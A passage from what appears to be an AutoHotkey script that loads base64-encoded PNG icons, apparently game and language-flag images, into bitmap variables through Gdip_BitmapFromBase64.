LOdZs0PlPTEpiQa4DZIYAYcHTlnsSQoo7CWevuNkOQJihIY/9nBISk4xq4tJVJ679ehFPRlISqoBlDJRmFRsJZCSpwoKOztce5inj4BKYqpdu/eU5YeAvalrj560KDJS3l/p3EWEYAoKro3NHcIzQicu9+67RfSAYS8MXyRlR/mOFin1ALXvADeKi0+Q98Cg6TLYK1euyDuM9vWbxApoBJWWkUlDeOlgnxvhPZoS1q6T9CCLuq9wH4lsIwI8pne/gY3ejjGcOn1aDiksPQ8+tCorqySveVB8YgEUQtyqeKE7K8Qww34TA+Q9yjhro8eME69CWL5iZePSw6Y/zNNbhGcEcXeeyaIdO8QzERAnJaU0thGf8JocCDhNPyw5JB5489Yt2SsRsJfAmyDAUQvuniNlH7WsC9tgIwLGgJN61WrDhMCjBg8dTmfOnJUliAOsaMdOyVM99WTp8bGK2cHm58aVhzBRGA+5DXWXioixrBQ3NRUGiSXiNcZPhOcBg4fKNWLgkGFiIDZS7AvKqanUQ5/wClxD0DfKoQw0YNBQ2aNwekIePqOlLbSD+igLb8Shg3elniLTfuDpsAsx7EKdvgMGGYU2BkpZ2K16j8L1AFd3rHVsihBmD7H32Akc+8segRj7wgg+WSyFdJTBLEB4VqDhGEeswMB9Bc8Y9EiuhyWl7DXoE+koAyEf6TiVDfcdXiKcD8/C8kAMDzaU9zXKUBfPpvaZjmMkX4XgGGjfY9QYKavYpvSpcjPPk0ud8jkKdxMUQmz5DmOVC6KpkI4yuBhCeMbRjfq4AyFGObmQ8qUPHoyT1lBvXtPFNJgvppwul07j5RB24UJpuFTOl3YwGdhDEGPbkDaNtih1lXcI7ViOA8LHNpyaUo8vqqZ9gonFZ70CSUjKfEPuVCLTZ5N3XCWwVK1kLINbPqTWFsrBldenb+DyhjrW9ZDG5biMoZx1PtrA3oGNFnFjm0ZbGusqtkFox9iWMg7FPrED9UxsQzkwMfv2wKXWpKH/A4i+xBUtzaRnAAAAAElFTkSuQmCC")
A_Args.PNG.bombheroes   := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Hbombheroes  := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.Bombpolygon  := Gdip_BitmapFromBase64(0,1,Data.PNG "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")
A_Args.PNG.HBombpolygon := Gdip_BitmapFromBase64(0,1,Data.PNG "")
A_Args.PNG.por  := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAARnSURBVEhLtdX9UxpHGAfw/gePaKIxFbUtgy8EFBBO5FVsgraGoIT4lnjiCzkZ4TykhPgWhRNFFBWDSqUoKkgx1lF86cs0JvuX9eykSW3aqe2MO/fL7ex+bu+53e99Ir7OdqELVTKhWiZS10hqFZhWWVOnrtaqJBoF0y9QYAKFVCCXCmqwCrlUKJcI5EwPJlBeXMyAKo28WquU12kUX9Yys5jbSlX1xRQV9kEv9eG8uT5V2NEcHXu6E2jf9GpCFJfGs1x6oBpgoB4I/S3bPS6pAZsRnAZw67NGmjheXLlIGqNj9tSSK/2yZcOjWCQLJ1phqOGSXuLDy3/Xm/7Q1SGqlMbBdR9sD8DSpHVgWz7WiR/MY7wsinlAOww3c704w/1Zly+S7Kvo2mWyyNsNjlYOpZ315KMlOArC3jygCByFQTchB1d77mSv6r/qxE6gZYPmBYeLvWY7zUNh2J9mmVqVYq2pUtOie1gfn2KjBCwtFoqm2jhzw/rIJJlavJLO1P3J9kJjzG+N4MdRLorBrLuIxSOAQwHPBndsUO6CslHSLkNJQLFCT7SZ0bt2Vhi9dWPy73Xmq96Z65WGXJo1mkr69g9wtIeheGEymJ0jtLP4g9kSC/C7gdcN/D6ooKCUDkxwUTIf7Up/3jcGXtH9u5HG6LRyiSz6WOfQ5pt+uzrsWE6Z0akZZVp+3dX8EsvbXOkao9fHxj0WgoysxxzuKY3JzZJSwHle1dCNkrd/SijRgQGdEYfHw0+3RkqCrryJxx+vvcu5pnv9So4OG1GGQIcd59+r3m5/qm0y54rdOUJLAUbwaq1m+2Q6vTc9HajWTwLP8cP6529SsvN9Izoh0ZkDZQzheAPfawSq8YNeqZKJpx/vxEXoQIwO9e91lGBXaDqAR7FEPbkYAfweqLCAwFpWa0sk071UML3CPd/F3umnLnSif53CdNMNQOkvrb2Y7snz2/FIX4YZetqFjtqYyqBUfnPH/RzsRZGKoc1sRT+3zgYiAnjWu52h5W/jKPXZj9uytwdGdGZFZ0MzKZsw6GSN43+tTJkPLwtY+CG3LuKZ3xt5k2lFaRnaLozQbOA6b0htbAXBEvWylf15MmuBylF0b5WeMqNkHkrK0IE+cTjsTIV1UT+2SBVP/sOOVIcpfXS8Jb7UsUkH4wa0UYQ2gLBI4Asn8EkQEFBBsKqcIA3Utz1CcUDx24mtuz2xZ/jOKpVeYXYkc3T/Zb8TiYAx5itZGFHMmJbnCtAa+BycCrUpV2TJFhJlctxulTB0Zi3bFPiqdI55Xa/9iqfpfRJolgfzPBZwPNI9k6QDcL4AMfrmqufW+TKgKNhm+DfcD2GCUCwMmv5HzrxLsW/0MGDMIr42u0uPZ+F8HrxTbI6rAYaYFDMxIXq1FPN2lvt7lCHKEBm1xP1t33mYeOJ6O7OcjUDqoL8eLA94pErlkMBAE1DN4NJnPTdwPE/k8/bmtVFbIuhMhUzRCXnQxn7RAlT9Jf0a/x7X1cTi3wB5iYNtnmiGmwAAAABJRU5ErkJggg==")
A_Args.PNG.porH := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAATkSURBVEhLtZV5TNNnGMcfDqeDjW1yjGWDcAqKOhgR7GRQTsFtcm5QRAqCKMoUSgdy2P4klLa0xUIF8UCl0JZySLkp1AqjiB1iEYFSBCLDeKCEZcuyCW7vOjNjWMymS0yef97kfT9v8jzf9/MCGnZ7ffUXvVgaVnwpgtcbVTkQ3ziULB9Jb1N9w78Sx5VFYE3bsYt+WK0vJgosqPPh1n+G1X2OSYKwlkCsbUdRd/gFBVFyLblvNFM5ntWiStEuC6XBWKMfJt3xnG4rJjk0Z/vKOURlxdFRycHrAv9ulrWIpFNCAFYY5IcCJfpt2k5rhj8UxAF3N5RG65yKtRCkeXcw469W0DXSkulLSUNV+E6maeV+KAp/TudKw2zEpHXN2T5yTuwzul83y1ZEgpIooO2C3NhADu6GWO/RRSBXOOqwtRccgHKitSANv5Lu1ck0eRl6oIxpJsgAzj5LVlBjtRGSwv1WmGkBpID7cgi+4AW8Awb8LN8OxqvRqaOSpCGhQ1u5uYBMFzmgyzBbq5uw39s1MOHjgKSQPaGqGmM0DtIOU5eaZMvmckI/n6np+G/6076fPTzSHjnYkKcgPVRaoWvQWGqm50gFCzY4FsB6GqwrAfszTLoHUgMaNK2+Sozu56eP9vCmL+0f4r+Yrp3q+uYs925eQJ+IpRbPzpHQzFY0bKpu1V/lTNfdUKjvlgNOGeCQAU7ZsJkNtkJJpRVSG6EJ959n4yS3RdiEIlJZ6y1lmP2Drs2MpYi8poHuJ+fINGS0QEYPkn6b8P/lmuH1nvQK4cDZc1W5VIZiYJBTVhOQWKrnzgbLk1vCM5D6nZ/GvNFcDFqk3n1YfvTGaZtWnuGFQyvoRdJwO3H68b7gx7c90b2v0TwF3UtZuuXz+833gmLJBq5lq5xz1uIojtvzyHT+1PRMbZ3kUwIfHDk/DHz4ZNJjeTYePWKgRQ6a331ZFe4kiAd25HM6WxrhWndodNgF3XFFd6PRPFVLX77li8aNNwekgANb1+WIwVYKOGXCplzYeMx+O21MPZ3FbpvusV6awP1NXyhBjwiPJ3HBtWHAJqzojLko07CBntafPa/dupCO7if/OuGPNEbElKg3cOfNfKjg9K0xHrPeQQMXKjge+yK1S3ZlGE1+8OOIxx9zcWgxDy0W1U/SnFu5uudIUBS2Yqr2YpJ9U45TV1lIf3XLzOknD/ahqW3opqlCZAxWx1e704zxFL1Psky8McNteWt9Oe/v7BXWkJHaEKk90B3C2N1yrkYeomzAdbDM+ftenEg/OStaeS5JJU25LmxVxaAhMzQElFw3+IgLG5iwkQqbKHpbuODeFJq8F6m0Z98du/Fl5uAJ0uh3rKkebSK1Jvi316T1DGVMEjcotmk/ha9PlDWvRX0g5lhs9kt80yVX35lq70miH9P6Dx706SdKIuyaS4MVArqmU5v3VzBBgKzQsDoHOHtDTrhNS2C5HQaFa3qr31qSAVJCQf2G1WV7oJKCby9M+B+eeWqxNCiOhvw4HepX5DK7h42w1AKCGhOLknAoOgjlCVbCl7FYZ6iNIHXdxSPeXawYxZmc4Ybk76t8OphWglQdbiQwQgALhZxdDgwfX44b5McCiwg8gs7JGIuqw14tdGLfGdpYG1fTlais9GwtMDmfBOxQrPMZ/fX+Hq+rht3+BMs8118TOOLTAAAAAElFTkSuQmCC")
A_Args.PNG.porS := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAThSURBVEhLtdV9TNNHGAfwhxenk81t8jKXDQL4AypFhBEpTAYt0AoTKNgqtlQKglWUqJQO5cUWiaWtbbEDQRRRKfQNRCsgCCLiKNMOEVSwFIXINL6ghmXLsolut85scWRm0yUmz1+Xy+cud899D9TahjdXf+i+dLLvasoSRlQQK46YQotOWxOZuiqIFWsZxKihWGwItiIEiw7DrVjmGxOExRAxKhGLD8MSiD6ryARmLIlNi0lPonJY4al0QlKsNz0Ci/scoxNf6At1XK+mvIguOdtYvXNIv/myinxG6qbhWpUyQLoSdicAn/muMM5NTIbiFFCshXKm1YFkZ1UWqU2SerFaZG4vHTvL6a8lnpY41myEEtoM3V3H9WzKC++SJ/+lR56RLtRwoXQNCJOgIDlKHnxFZ/PoOPCqcVYyywKboJLtpsoiztTDTkscXkWP6pQ4qXJAvsFFGn2ibh5qh/stMN4MyAD3u4B6NAzKNs1V5ka0iV9PFwzpOf1qr1OVC1Q8kcYLnYOJeuu0jaSAqLQlFE78uoQBrT26Du1tjv7aDJemSkavUmJu+2/9+bkf2nq1NbGvscjAfWh0RZfgRLmTDU4AzjLAFcMiIXiWgkeVRBSCTID6HOsuspm9yuyh7rKxsxv7lS/XLbe6qCmXcKaM0qORmnQTt7loPAgNOppabGf5iay999gG5gM+B7xyAJ8HvjJYqNbXuCLTPDRC+HEiRX9LUzhiSDTWk9rFTv/UXTS8OY2iyC55p5mHHvPQA84vI+SfLtld7s6uVl84dLi2QCA2XOiTV2gp6eU2BBm47F9Ky0Gm934YJqHbLDQluPuwcueVg+4tZXZHt8zQfehkTJe9t4f65FYourcaTfLRvczpG+G/XvsgOpk3N6Bill/+/GA+bnkRT6S8OTZe36D/jKEEnPy7Cx8/Gw15OpGKHonRlBxNrj03QMOrUkGW+ELH0ykBDVuGBv3RnQB0l4kmBRb96Y0IdN3el5IJXjJr/x1zg/iA3w6LC8Bnl8dy4bBpLFd2aqzbbXok+E/9cSl6xHgyGkytXwkyxoyTWaDZbtcoyurNm7RMfZyN7mf8PEJG5nnszDVvBR9xChcA/kt7YqHbF0LwFwBuV8y2js5vBtHoR99fDfntdgqaKkJTJcdGhX4tCuvDXChZOUP30HE9TubjOyrie+uaxw8+e7AB3VyGrjkaNPbgunc2QWhP5Nt8mutAKrRbVjQ/Qv5h3Hm1lodMdsgUgu4whu9WKsxd8cbG4DbpAuWGl3dkZJeUaTzMGWjPvKxuGWChfifUD/yCQPhEAd4S8BHAYr7NUgUQTiZkrEcDgAbfH74Su71vH3foa+nNbktHWpLg316TJWf4w/qUPp176wHisfTOpvmoB3RyZ9/I9Lf9C2z9BB6hXNGuQDQID3ps0/V0rKmcalCJzKct/f4aSUDp3GNXlw/y9fH7Asf08LQV+tRzzte9M90JyAjFx7xnV6yDGj6xdU/a/8iZ5ymWBV8xYXeKlWAVrwJ7eAKmm0GldXAupUHJZqhMc1W/SorRIt1V2zyP7yB1SFmGqvzBxoxva8PbJK6qbVaKRBDHQ2EC5Cd5icMj5IGwOxmkbChjWO1nOdduDWsWsXuqhMOnFOaOdGNNaEuxwxEOyBIw2t/2/gZ/jzdV2obfATXYh08qa0uKAAAAAElFTkSuQmCC")
A_Args.PNG.eng  := Gdip_BitmapFromBase64(0,1,Data.PNG "B8AAAAUCAIAAAD6C3GtAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAWASURBVEhLtZX9VxJZGMf3P5haC8tWUdtc2wqB4X14Hd6ybE3LDUEjwwA1NBKRNFdF1IwkJJU4EEWEgkIyvIw4LCL8ZXsjtN3O2R97zvfcMzN3zmee+d7nufcn+EfGFzqTI4DZAg4ihtlCoVjG5UtEqIzK4HP5YgqVw+QKaTBXRKF8lbgiSUUohSKl0WRMloKHKBC+nMWSUmngOXgBTFXpHJ5IZVqVqBdW1ra79M5dDNeMbb7YjNReMwxPuurZuguMwbDfH/T7Az5/6P3HWGRnbzeZTKRSe+lcNlfM58vFIlCpUCD2cSwej4ZCMqm0SmdxhYzbz0esXlbH/Jo/brT53wTjTXLL4LSntrFPNbbULDT6npi94xPep5aAdSo8PRudc+zMOeL2xbTLTfh8h5GtQjR26A9kXW7MH8AwDJWgJ3RR16CT3T1rWQ52DLm8gcTgpM804zvTOqAffXlWNEGq73RB0AsIWoYgJwS5IWgTgrwQ5IOgT02tCYkSNwzvjz5N96gIr48giCeTLpjOqdKBs0jHlO7Z207j6vJmzLLwwe7aFvYu9I+vUdiGTu1Mg8S0Ff/8MZ74sBuPYJndHIERhTRRwP8+zBdLpXI1jkql6G62q98ONWpoMO8bXaZeRNQOvdXbZXR5fDv6Kd+AdeM8bGrXTF9ERs9duf9O27+h7ff03X+rffhe9yiiN0b0Q1Hj0J7FlltxHuF44fDIvRlrVy2QqUao7h6Ndpw7cEbZO6uzbfQ+di55InMvt5c2tlCNQ6N7BUtMHQOL9VfVq6drVmrOrvxMWq0heWpI3jMkbw0pcPZc7I6KwNLFw2K5+g+lcjFP4JgclXyjKzTPJZpFnSWgfRZw+RPm5WDPiIt/08a7a2tDhxsFI5GDg/DBQShHbBVLiXI5DUQQOxbr1u2ePZ0Bt03nnavEinPfYt3rfxC5cUvK5Z7QhYw//1L2Oe6OrRutHvvrqHnh/c2Hr4S3bb8rrVSlBeTu4SJuROBChOt8sU+IvmNwffXNgfMNoYutMYEEU2lyZsv+mDnV1bNFZwXqyBIqrUpncoRNyNgdg7utc3bpTbTn8ZovnCI1qO+Nu0jn29vv2zlyg7OB7CQ3OslNbnKz5xfyRl2Dr44MKKFfL8eEKKbqq9CfproBnR240CihUqt0hVIJPCtWbDuqjF8tLJTKhXJ5J0dE0tkwkQ8RhYBn/TWFvk5j+jhIkCcKIaKIVJlQ9WVMT4h5x8GcPWscjv9x5yNfjLKPVxVlMqNC+Z5Umenu2R80ENbJnN64p7geoTMCVPoGje661uakwi+bLq2cq3fW1n2KbO9m9rFCKV0s45UMTooSBLgmSkfyk15F